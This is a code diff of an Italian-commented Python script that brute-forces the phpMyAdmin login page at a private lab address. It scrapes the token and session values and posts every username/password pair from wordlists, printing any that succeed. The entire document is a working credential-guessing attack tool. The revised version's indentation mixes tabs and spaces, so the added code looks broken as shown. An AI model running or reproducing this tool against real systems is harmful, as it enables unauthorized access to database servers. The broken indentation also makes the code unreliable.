@@ -1,56 +1,78 @@
-import http.client, urllib.parse, re 
+#Programma per fare il brute force sulla pagina PhpMyAdmin
 
-lista_username = open("/usr/share/nmap/nselib/data/usernames.lst")
-lista_password = open("/usr/share/nmap/nselib/data/passwords.lst")
+import http.client, urllib.parse, re    #Importa i moduli necessari per effettuare richieste HTTP, analizzare URL e utilizzare espressioni regolari 
 
-user = lista_username.readlines()     
-password = lista_password.readlines()  
+#Apre due file di testo che contengono liste di username e password. Questi file vengono utilizzati per tentare di accedere al sistema con combinazioni diverse di credenziali
 
-for usr in user:                       
-	usr = usr.rstrip()
-	for pwd in password:
+lista_username = open("/home/kali/username") 
+lista_password = open("/home/kali/passwords")
 
-		pwd = pwd.rstrip()
+#Legge le linee dai file degli username e delle password e memorizza i risultati nelle variabili user e password
 
-		conn = http.client.HTTPConnection("192.168.50.101")  
-		conn.request("GET", "/phpMyAdmin/index.php")
-		response = conn.getresponse()
-		data = response.read().decode()
+user = lista_username.readlines()
+password = lista_password.readlines()
+
+#nizia un doppio loop annidato per iterare su tutte le combinazioni di username e password
+
+for usr in user:
+    usr = usr.rstrip()
+    for pwd in password:
+        pwd = pwd.rstrip()
+
+#Stabilisce una connessione HTTP al server (presumibilmente un server locale all'indirizzo IP 192.168.50.101) e fa una richiesta GET alla pagina di login di phpMyAdmin 
+#Legge la risposta e la memorizza nella variabile data        
+
+ 	conn = http.client.HTTPConnection("192.168.50.101")
+        conn.request("GET", "/phpMyAdmin/index.php")
+        response = conn.getresponse()
+        data = response.read().decode()
+
+#Utilizza espressioni regolari per estrarre i valori dei token dalla risposta. Questi token saranno utilizzati successivamente per autenticarsi e mantenere la sessione        
 
 	pattern = r'name="token" value="(\w+)"'
-	match = re.search(pattern, data)
-	token = match.group(1)
-	pattern = r'name="phpMyAdmin" value="(\w+)"'
-	match = re.search(pattern, data)
-	phpMyAdmin_token = match.group(1)
+        match = re.search(pattern, data)
+        token = match.group(1)
+        pattern = r'name="phpMyAdmin" value="(\w+)"'
+        match = re.search(pattern, data)
+        phpMyAdmin_token = match.group(1)
 
-	post_parameters = urllib.parse.urlencode({'phpMyAdmin':phpMyAdmin_token, 'pma_username': usr, 'pma_password': pwd, 'server':'1','token':token})  
-	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml"} 
+#Prepara i parametri POST e gli header per la successiva richiesta di autenticazione
+
+	post_parameters = urllib.parse.urlencode({'phpMyAdmin': phpMyAdmin_token, 'pma_username': usr, 'pma_password': pwd, 'server': '1', 'token': token})
+        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml"}
+
+#Invia la richiesta POST con le credenziali tentate al server, legge la risposta senza fare nulla con essa e raccoglie eventuali cookie ottenuti dalla risposta        
 
 	conn.request("POST", "/phpMyAdmin/index.php", post_parameters, headers)
 
-	response = conn.getresponse()
-	response.read().decode()
-	cookie_header = response.getheaders()
-	cookie_def = 'phpMyAdmin='+phpMyAdmin_token+';'
-	dest_cookie = []
-	for cookie in cookie_header:
-		if cookie[0] == 'Set-Cookie'and "pma" in str(cookie[1]):
-			cookie_def = cookie_def + cookie[1].split(";")[0]+';'
-        
-	
+        response = conn.getresponse()
+        response.read().decode()
+        cookie_header = response.getheaders()
+        cookie_def = 'phpMyAdmin=' + phpMyAdmin_token + ';'
+        dest_cookie = []
+        for cookie in cookie_header:
+            if cookie[0] == 'Set-Cookie' and "pma" in str(cookie[1]):
+                cookie_def = cookie_def + cookie[1].split(";")[0] + ';'
 
-	post_parameters = urllib.parse.urlencode({'token':token})
-	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':cookie_def} 
-	url_php = '/phpMyAdmin/index.php'
-	urla= ''
-	urla += '?' + post_parameters
-	url_target = url_php + urla
+#Prepara i parametri e gli header per una richiesta GET successiva con il token e i cookie ottenuti durante la fase di autenticazione        
+
+	post_parameters = urllib.parse.urlencode({'token': token})
+        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie': cookie_def}
+        url_php = '/phpMyAdmin/index.php'
+        urla = ''
+        urla += '?' + post_parameters
+        url_target = url_php + urla
+
+#Invia la richiesta GET con i parametri preparati al server, legge la risposta e verifica se la stringa "main.php?token={token}" è presente nella risposta, indicando che l'accesso è stato effettuato con successo. 
+#Se è così, stampa le credenziali utilizzate per l'accesso. 
+#Infine, chiude la connessione HTTP        
 
 	conn.request("GET", url_target, post_parameters, headers)
-	response = conn.getresponse()
-	data2 = response.read().decode()
+        response = conn.getresponse()
+        data2 = response.read().decode()
 
-	if f"main.php?token={token}" in str(data2):
-		print("Logged with: ", usr, " - ",pwd)
-	conn.close()
+        if f"main.php?token={token}" in str(data2):
+            print("Logged with: ", usr, " - ", pwd)
+        
+        conn.close()
+
